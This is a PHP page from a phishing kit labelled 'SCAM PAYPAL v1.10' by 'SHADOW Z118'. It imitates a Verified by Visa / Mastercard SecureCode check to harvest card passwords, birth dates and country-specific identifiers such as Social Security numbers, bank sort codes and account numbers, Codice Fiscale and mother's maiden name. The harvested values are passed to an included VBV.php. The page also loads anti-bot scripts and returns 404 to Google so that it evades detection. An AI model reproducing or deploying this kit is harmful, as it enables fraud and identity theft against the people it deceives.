<?php
/*   
   _____   _                   _                        ______    __    __     ___  
  / ____| | |                 | |                      |___  /   /_ |  /_ |   / _ \ 
 | (___   | |__     __ _    __| |   ___   __      __      / /    | |   | |   | (_) |
  \___ \  | '_ \   / _` |  / _` |  / _ \  \ \ /\ / /     / /   - | | - | | -  > _ < 
  ____) | | | | | | (_| | | (_| | | (_) |  \ V  V /     / /__  - | | - | | - | (_) |
 |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                
                              #=======================#
                              #   SCAM PAYPAL v1.10   #
                              #      SHADOW Z118      #
                              #=======================#
							  
                $$$$$$$\                     $$$$$$$\           $$\   
                $$  __$$\                    $$  __$$\          $$ |  
                $$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |  
                $$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |  
                $$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |  
                $$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |  
                $$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |  
                \__|      \_______| \____$$ |\__|      \_______|\__|  
                                   $$\   $$ |                         
                                   \$$$$$$  |                         
                                    \______/                          
*/

session_start();
error_reporting(0);
################## VBV INFORMATION ##################
$_SESSION['_password_vbv_'] = $_POST['password_vbv'];
$_SESSION['_dob_'] = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
$_SESSION['_sortnum_'] = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
$_SESSION['_accnumber_'] = $_POST['accnumber'];
$_SESSION['_ssnnum_'] = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
$_SESSION['_mmname_'] = $_POST['mmname'];
$_SESSION['_creditlimit_'] = $_POST['creditlimit'];
$_SESSION['_osid_'] = $_POST['osid'];	
$_SESSION['_codicefiscale_'] = $_POST['codicefiscale'];
$_SESSION['_kontonummer_'] = $_POST['kontonummer'];
$_SESSION['_offid_'] = $_POST['offid'];
$_SESSION['_phone_'] = $_POST['phone'];
$_SESSION['_phone_numb_'] = $_POST['phone_numb'];
################## VBV INFORMATION ##################
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if(empty($_POST['password_vbv'])== false) {
        include('VBV.php');
	}
}
$VISACARD   = $_SESSION['_c_type_'] == "VISA" || $_SESSION['_c_type_'] == "VISA ELECTRON";
$MASTERCARD = $_SESSION['_c_type_'] == "MASTERCARD" || $_SESSION['_c_type_'] ==  "MAESTRO";
if($MASTERCARD) {
	$Type_XXX = "&#x4D;&#x61;&#x73;&#x74;&#x65;&#x72;&#x43;&#x61;&#x72;&#x64;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;<sup>TM</sup>";
	$VBV_Name = "&#x53;&#x65;&#x63;&#x75;&#x72;&#x65;&#x43;&#x6F;&#x64;&#x65;<sup>TM</sup>";
}elseif($VISACARD) {
	$Type_XXX = "&#x56;&#x65;&#x72;&#x69;&#x66;&#x69;&#x65;&#x64;&#x20;&#x62;&#x79;&#x20;&#x56;&#x69;&#x73;&#x61;";
	$VBV_Name = "&#x33;&#x44;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;&#x20;";
}
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<html lang="en"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="./INC/T_Z118.css">
    <link rel="stylesheet" href="./INC/V_Z118.css">
    <title>&#x33;&#x2D;&#x44;&#x20;&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x41;&#x75;&#x74;&#x68;.</title>
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" type="image/png" href="../../lib/img/favicon.ico"></style>
</head>
<body>
<div id="Rotation"><p style="font-size: 13px;">3-D Security has been successfully processed...</p></div>
    <div id="xMarcos_9X9X" style="opacity: 1;">
	<div id="popup"><p>Processing </p></div>
        <div id="xGhostRiderForm" style="display: none;">
            <div id="xDoctorStrange_L0">
                <table>
                    <tbody>
                        <tr>
                            <td><img class="cc_bank" id="cc_bank" src="./INC/ssl.png"></td>
							<?php 
							if($MASTERCARD) {	
                                echo '<td><img class="cc_type" id="cc_type" src="./INC/mastercard-securecode.png"></td>';
							}elseif($VISACARD){
								echo '<td><img class="cc_type" id="cc_type" src="./INC/verified-by-visa.png"></td>';
							}
							?>
                        </tr>
                    </tbody>
                </table>
            </div>
			<div id="xDoctorStrange_L1" style="text-align: center;font-family: PayPal-Sans-Regular, sans-serif;"><?=$_SESSION['_cc_bank_'];?></div>
            <div id="xDoctorStrange_L1">Added Safety Online</div>
            <div id="xDoctorStrange_L2"><?=$Type_XXX;?> helps protect your <b></b> card against unauthorized use online - at no additional cost. To use <?=$Type_XXX;?> on this and futur purshases. complete this page You'll the create your own <?=$Type_XXX;?> Password</div>
            <div id="xDoctorStrange_L3">
                <table>
                    <tbody>
                        <tr>
                            <td style="font-weight: bold;">Name on card :</td><td><?=htmlentities($_SESSION['_nameoncard_']);?></td>
                        </tr>                      
						<tr>
                            <td style="font-weight: bold;">Country Name :</td><td><?=ucwords(strtolower($_SESSION['_country_']));?></td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">Card Type :</td><td><?=ucwords(strtolower($_SESSION['_ccglobal_']));?></td>
                        </tr>
                        <tr>
                            <td style="font-weight: bold;">Card Number :</td><td>XXXX-XXXX-XXXX-<?=substr($_SESSION['_cardnumber_'] , -4);?></td>
                        </tr>
						<tr>
                            <td style="font-weight: bold;">Date time :</td><td><?=date('d/m/Y').", ".date('g:i a');?></td>
                        </tr>
						<form name="F0rmVBV" method="post" action="" class="F0rmVBV">
						<tr class="Height_XXX">
                            <td style="font-weight: bold;">Birth Date :</td>
                            <td><input style="width: 44px;text-align: center;" id="day" type="tel" placeholder="Day" name="day" class="dob" maxlength="2" data-maxlength="2"> / <input style="width: 50px;text-align: center;" id="month" type="tel" placeholder="Month" name="month" class="dob" maxlength="2" data-maxlength="2"> / <input style="width: 58px;text-align: center;" id="year" type="tel" placeholder="Year" name="year" class="dob" maxlength="4" data-maxlength="4"></td>						</tr>
                        <tr class="Height_XXX">
                            <td style="font-weight: bold;"><?=$VBV_Name;?> :</td>
                            <td><input required type="text" name="password_vbv" id="password_vbv" style="width: 170px;padding-left: 4px;"></td></tr>
						<?php
						############################ ITALY ############################	
		    				if($_SESSION['_cntrcode_'] == "IT") {	
								echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;">Codice Fiscale :</td>
                            				<td><input required type="tel" name="codicefiscale" id="codicefiscale" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
        				################### SWITZERLAND || GERMANY #####################
		    				elseif($_SESSION['_cntrcode_'] == "CH" || $_SESSION['_cntrcode_'] == "DE") {	
								echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Kontonummer :</td>
                            				<td><input required type="tel" name="kontonummer" id="kontonummer" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
						########################### GREECE #############################
		    				elseif($_SESSION['_cntrcode_'] == "GR") {	
								echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Official ID :</td>
                            				<td>
                                				<input required type="tel" name="offid" id="offid" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';  
		    				}
						########################## AUSTRALIA ###########################
		    				elseif($_SESSION['_cntrcode_'] == "AU") {
			    				echo '<tr class="Height_XXX">
                            				<td style="font-weight: bold;">OSID :</td>
                            				<td><input required type="tel" name="osid" id="osid" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>
										<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Credit Limit :</td>
                            				<td><input required type="tel" name="creditlimit" id="creditlimit" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';
		    				}
						################# IRELAND || UNITED KINGDOM  ###################
		    				elseif ($_SESSION['_cntrcode_'] == "IE" || $_SESSION['_cntrcode_'] == "GB" ) {
		        				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;">Sort Code :</td>
                            				<td><input required type="tel" name="sortnum1" id="sortnum1" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum2" id="sortnum2" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> - <input required type="tel" name="sortnum3" id="sortnum3" class="sortnum" style="width:28px;text-align:center"  maxlength="2" data-maxlength="2"> (XX-XX-XX)</td>
                        				</tr>                  
                        				<tr class="Height_XXX">
                            				<td style="font-weight: bold;">Account Number :</td>
                            				<td><input required type="tel" name="accnumber" id="accnumber" class="accnumber" style="width: 170px;padding-left: 4px;"></td>
                        				</tr>';			   
			    
    						}
						#################### UNITED STATES || CANADA ###################
							elseif ($_SESSION['_cntrcode_'] == "US" || $_SESSION['_cntrcode_'] == "CA") {
			    				echo '  <tr class="Height_XXX">
                            				<td style="font-weight: bold;padding-left: 15px;">Social Security Number :</td>
                            				<td><input required type="tel" name="ssn1" id="ssn1" class="ssnum" style="width:30px;padding-left: 2px;" maxlength="3" data-maxlength="3"> - <input required type="tel" name="ssn2" id="ssn2" class="ssnum" style="width: 24px;padding-left: 2px;" maxlength="2" data-maxlength="2"> - <input required type="tel" name="ssn3" id="ssn3" class="ssnum" style="width:40px;padding-left: 4px;" maxlength="4" data-maxlength="4"> (XXX-XX-XXXX)</td>
                        				</tr>';
							}
						#################### IRELAND || CANADA ###################
							if ($_SESSION['_cntrcode_'] == "IRELAND" || $_SESSION['_cntrcode_'] == "CANADA") {
							   echo'<tr class="Height_XXX">
                            			<td style="font-weight: bold;padding-left: 15px;">Mother’s Maiden Name :</td>
                            			<td><input required type="tel" name="mmname" id="mmname" style="width: 170px;padding-left: 4px;"></td>
                        			</tr>';
			    			}			
						?>
						<tr class="Height_XXX">
                            <td style="font-weight: bold;">Phone number :</td>
                            <td> + <input required type="tel" name="phone" id="phone" style="width: 30px;text-align:center;" value=""> - <input required type="tel" name="phone_numb" id="phone_numb" style="padding-left: 4px;width: 120px;" maxlength="10"></td>
                        </tr>
						<tr>
                            <td></td>
                            <td>
                                <input type="submit" name="vbv_submit_btn" id="vbv_submit_btn" value="Submit"></form>
                                
                            </td>
                        </tr>	
                        <tr>
                            <td><?=$_SESSION['_cc_phone_'];?></td>
                            <td><?=$_SESSION['_cc_site_'];?></td>
                        </tr>
                    </tbody>
                </table>
                <!-- </form> -->
            </div>
        </div>
    </div>
<input type="hidden" name="country_form" id="country_form" value="<?=$_SESSION['_cntrcode_'];?>">
<script src="../../lib/js/jquery.js"></script>
<script src="./INC/V-Z118.js"></script>    
</body>
</html>